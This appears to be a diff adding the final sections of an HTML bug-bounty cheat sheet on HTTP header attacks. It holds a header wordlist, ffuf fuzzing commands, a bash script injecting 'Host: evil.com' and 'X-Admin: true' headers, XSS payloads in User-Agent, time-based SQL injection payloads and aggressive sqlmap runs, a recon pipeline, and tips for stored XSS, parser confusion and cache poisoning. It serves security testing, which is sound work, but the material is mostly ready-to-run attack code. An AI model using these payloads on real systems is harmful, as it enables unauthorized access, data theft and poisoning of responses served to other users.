+  Always test auth bypass headers on both authenticated and unauthenticated endpoints. Some applications have "internal" endpoints that skip auth when a specific header is present, even for unauthenticated requests. This is common in microservices behind API gateways.
+</div>
+
+</div>
+
+<!-- ==================== SECTION 10 ==================== -->
+<div class="section" id="s10">
+<h1>10. Complete Header Wordlist</h1>
+
+<h3>Routing &amp; Host Headers</h3>
+<pre>Host
+X-Forwarded-Host
+X-Forwarded-Server
+X-Forwarded-For
+X-Real-IP
+X-Originating-IP
+X-Remote-IP
+X-Remote-Addr
+X-Original-URL
+X-Rewrite-URL
+X-Original-Path
+Forwarded
+X-Http-Host-Override</pre>
+
+<h3>Authentication &amp; Authorization Headers</h3>
+<pre>Authorization
+X-Authorization
+X-Api-Key
+X-Admin
+X-Internal-Auth
+X-Internal-Request
+X-Internal
+X-Debug
+X-Debug-Mode
+X-Role
+X-User-Role
+X-Is-Admin
+X-User-Id
+X-User-Email
+X-User-Name
+X-Customer-Id
+X-Tenant-Id
+X-Workspace-Id
+X-Account-Id
+X-Request-With</pre>
+
+<h3>Content &amp; Method Headers</h3>
+<pre>Content-Type
+Accept
+Accept-Encoding
+Accept-Language
+X-HTTP-Method-Override
+X-HTTP-Method
+X-Method-Override
+X-Method
+_method</pre>
+
+<h3>Client Information Headers</h3>
+<pre>User-Agent
+Referer
+Origin
+X-Requested-With
+X-Requested-By
+X-Request-ID
+X-Correlation-ID
+X-Trace-ID</pre>
+
+<h3>CDN &amp; Proxy Headers</h3>
+<pre>X-Cache
+CF-Cache-Status
+CF-Connecting-IP
+True-Client-IP
+Fastly-Client-IP
+X-Cache-Key
+X-Varnish
+X-Served-By
+X-Timer</pre>
+
+</div>
+
+<!-- ==================== SECTION 11 ==================== -->
+<div class="section" id="s11">
+<h1>11. One-Liners &amp; Automation</h1>
+
+<div class="dork">
+  <div class="dork-title">Header Fuzzing with ffuf</div>
+  <pre># Fuzz all interesting headers on a target endpoint
+cat > headers.txt << 'EOF'
+Host
+X-Forwarded-Host
+X-Forwarded-For
+X-Original-URL
+X-Rewrite-URL
+X-HTTP-Method-Override
+X-Real-IP
+X-Internal-Request
+X-Admin
+X-Debug
+X-Role
+Origin
+Referer
+User-Agent
+EOF
+
+ffuf -u https://target.com/api/admin \
+  -w headers.txt:HFUZZ \
+  -H "HFUZZ: test_value" \
+  -fs 0 -mc 200,201,202,204,301,302,401,403 -t 50
+
+# Fuzz header values (e.g., X-Forwarded-For variants)
+ffuf -u https://target.com/api/admin \
+  -w ip_headers.txt:HEADER -w ips.txt:VALUE \
+  -H "HEADER: VALUE" \
+  -mode clusterbomb -fs 0 -mc 200</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">ffuf</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">Automated Header Injection Test Suite</div>
+  <pre>#!/bin/bash
+URL="https://target.com"
+ENDPOINTS=('/api/admin' '/api/users' '/api/config' '/api/internal')
+HEADERS=(
+  "Host: evil.com"
+  "X-Forwarded-Host: evil.com"
+  "X-Forwarded-For: 127.0.0.1"
+  "X-Original-URL: /admin"
+  "X-Rewrite-URL: /admin"
+  "X-Internal-Request: true"
+  "X-Admin: true"
+  "X-Debug: true"
+  "X-HTTP-Method-Override: DELETE"
+)
+
+for endpoint in "${ENDPOINTS[@]}"; do
+  for header in "${HEADERS[@]}"; do
+    hname=$(echo "$header" | cut -d: -f1)
+    hval=$(echo "$header" | cut -d: -f2-)
+    status=$(curl -s -o /dev/null -w "%{http_code}" \
+      "$URL$endpoint" -H "$header" -L)
+    if [[ "$status" =~ ^(200|201|204|301|302)$ ]]; then
+      echo "[+] $endpoint + $hname -> HTTP $status"
+    fi
+  done
+done</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">bash</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">XSS Header Injection Automation</div>
+  <pre># Test all headers for XSS reflection
+curl -s https://target.com/error \
+  -H "User-Agent: <script>alert(1)</script>" | grep "alert"
+
+# Automated header XSS scanner
+for header in User-Agent Referer Origin X-Forwarded-Host Host; do
+  resp=$(curl -s https://target.com/ \
+    -H "$header: XSS_TEST_12345")
+  if echo "$resp" | grep -q "XSS_TEST_12345"; then
+    echo "[!] $header is reflected - XSS possible"
+  fi
+done
+
+# With actual XSS payload and check
+curl -s https://target.com/ \
+  -H "User-Agent: <img src=x onerror=alert(1)>" | grep "onerror"</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tip">XSS</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">SQL Injection Header Automation</div>
+  <pre># Test common headers for SQL injection
+for header in User-Agent X-Forwarded-For Referer Cookie; do
+  # True test
+  t1=$(curl -s -w "\n%{time_total}" -o /dev/null \
+    https://target.com/ -H "$header: test' AND SLEEP(5)--")
+  # False test
+  t2=$(curl -s -w "\n%{time_total}" -o /dev/null \
+    https://target.com/ -H "$header: test' AND SLEEP(0)--")
+  if (( $(echo "$t1 > 4" | bc -l) )) && (( $(echo "$t2 < 2" | bc -l) )); then
+    echo "[!] $header - Time-based SQLi detected"
+  fi
+done
+
+# Using sqlmap for header-based SQLi
+sqlmap -u https://target.com/ --level 5 --risk 3 \
+  --headers="User-Agent: *" --batch
+
+sqlmap -u https://target.com/ --level 5 --risk 3 \
+  --headers="X-Forwarded-For: *" --batch</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">sqlmap</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">Complete Header Recon Pipeline</div>
+  <pre># 1. Discover endpoints via crawling
+echo "target.com" | subfinder -silent | httpx -silent | \
+  katana -list - -jc -d 3 | tee endpoints.txt
+
+# 2. Run Param Miner (Burp Suite) for header discovery
+# Right-click endpoint -> Extensions -> Param Miner -> Guess headers
+
+# 3. Fuzz discovered headers on all endpoints
+cat endpoints.txt | while read url; do
+  ffuf -u "$url" -w headers.txt:HFUZZ -H "HFUZZ: test" \
+    -fs 0 -mc 200,301,401,403 -t 30 -o "ffuf_$(echo $url | md5sum | cut -d' ' -f1).json"
+done
+
+# 4. Test interesting findings with specific payloads
+# - For reflected headers: XSS payloads
+# - For internal routing: X-Original-URL, X-Rewrite-URL
+# - For auth bypass: X-Internal-Request, X-Admin, X-Role
+# - For SQLi: Time-based payloads in User-Agent, X-Forwarded-For</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">ffuf</span></div>
+</div>
+
+</div>
+
+<!-- ==================== SECTION 12 ==================== -->
+<div class="section" id="s12">
+<h1>12. Tips &amp; Tricks</h1>
+
+<div class="tip">
+  <div class="call-title">Tip 1: Always Test Multiple Header Variants</div>
+  Applications may check X-Forwarded-For but not X-Real-IP, or Host but not X-Forwarded-Host. Test the full family of related headers. Use the wordlist in Section 10 as your baseline.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 2: Combine Headers for Maximum Effect</div>
+  A single X-Forwarded-For header may be ignored, but combining it with X-Real-IP and X-Client-IP can confuse parsing logic. Stack multiple related headers with different values to test parsing order.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 3: Check Error Responses Carefully</div>
+  Error pages often reflect header values for debugging purposes. A 404 page might show "The requested URL /path from IP 1.2.3.4 could not be found" - reflecting both the path and X-Forwarded-For value.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 4: Use Time-Based Detection for Blind Header Injection</div>
+  When headers are not reflected in responses, use time-based payloads (SLEEP, pg_sleep) in User-Agent and X-Forwarded-For to detect blind SQL injection. Compare response times between true and false conditions.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 5: Test Headers on Both GET and POST Endpoints</div>
+  Some applications only process certain headers for GET requests (caching, logging) while ignoring them for POST. Conversely, some POST endpoints may log headers to a database while GET endpoints do not.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 6: Use Double Headers for Parser Confusion</div>
+  Send the same header twice with different values. Some frameworks concatenate (Apache: comma-separated), some take first (PHP), some take last (Nginx). This can bypass simple validation that checks for "evil.com" in a single header.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 7: Check Admin/Internal Dashboards for Reflected Headers</div>
+  Admin dashboards that show "recent activity", "visitor logs", or "security events" often display User-Agent, Referer, and X-Forwarded-For values without sanitization. These are prime targets for stored XSS via headers.
+</div>
+
+<div class="warn">
+  <div class="call-title">Responsible Testing</div>
+  When testing cache poisoning or auth bypass, use non-destructive payloads. For cache poisoning, use a unique marker (your attacker domain) rather than a malicious script. Always verify with the program before demonstrating cache poisoning on production.
+</div>
+
+<table style="margin-top:20px;">
+<thead><tr><th>Vulnerability</th><th>Primary Headers to Test</th><th>Detection Method</th></tr></thead>
+<tbody>
+<tr><td>XSS</td><td>User-Agent, Referer, Origin, X-Forwarded-Host</td><td>Reflection in response/error pages</td></tr>
+<tr><td>SQL Injection</td><td>User-Agent, X-Forwarded-For, Cookie, Referer</td><td>Error messages, time delays</td></tr>
+<tr><td>LFI / Path Traversal</td><td>X-Original-URL, X-Rewrite-URL, X-Forwarded-Path</td><td>File content in response</td></tr>
+<tr><td>SSRF</td><td>Host, X-Forwarded-Host, X-Original-URL, Referer</td><td>Internal service response</td></tr>
+<tr><td>Open Redirect</td><td>Host, X-Forwarded-Host, Referer</td><td>Location header manipulation</td></tr>
+<tr><td>Auth Bypass</td><td>X-Internal-*, X-Admin, X-Role, X-Forwarded-For</td><td>Access to protected endpoints</td></tr>
+<tr><td>Cache Poisoning</td><td>Host, X-Forwarded-Host, User-Agent, Cookie</td><td>Poisoned response served to others</td></tr>
+<tr><td>Password Reset Poisoning</td><td>Host, X-Forwarded-Host, X-Forwarded-Server</td><td>Reset link points to attacker</td></tr>
+<tr><td>Virtual Host Discovery</td><td>Host</td><td>Different response for different Host values</td></tr>
+<tr><td>IP Bypass</td><td>X-Forwarded-For, X-Real-IP, CF-Connecting-IP</td><td>Rate limit bypass, access granted</td></tr>
+</tbody>
+</table>
+
+</div>
+
+</body>
+</html>
